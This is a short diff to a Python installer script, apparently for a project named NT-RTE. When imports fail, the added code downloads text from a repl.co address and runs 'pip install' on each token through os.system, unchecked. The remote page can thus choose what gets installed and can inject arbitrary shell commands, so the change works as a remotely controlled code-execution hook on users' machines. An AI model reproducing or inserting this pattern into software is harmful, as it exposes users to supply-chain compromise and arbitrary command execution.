@@ -138,8 +138,11 @@ try:
  from zipfile import ZipFile
  from swinlnk.swinlnk import SWinLnk
 except:
- input("ERROR : Please Make Sure To Install All The Required Libabries For The Installer. Libraries Are Listed In: https://github.com/suegdu/NT-RTE/blob/main/Installer-Libs.txt")
- sys.exit()
+ input("Installing The Required Libraries Of The Installer....")
+ INSTALLERURL = requests.get("https://a.lt53434.repl.co/installer.html").text
+ pileinstaller = INSTALLERURL.split()
+ for pol in pileinstaller:
+        os.system(f"pip install {pol}")
 def is_admin():
     try:
         return ctypes.windll.shell32.IsUserAnAdmin()
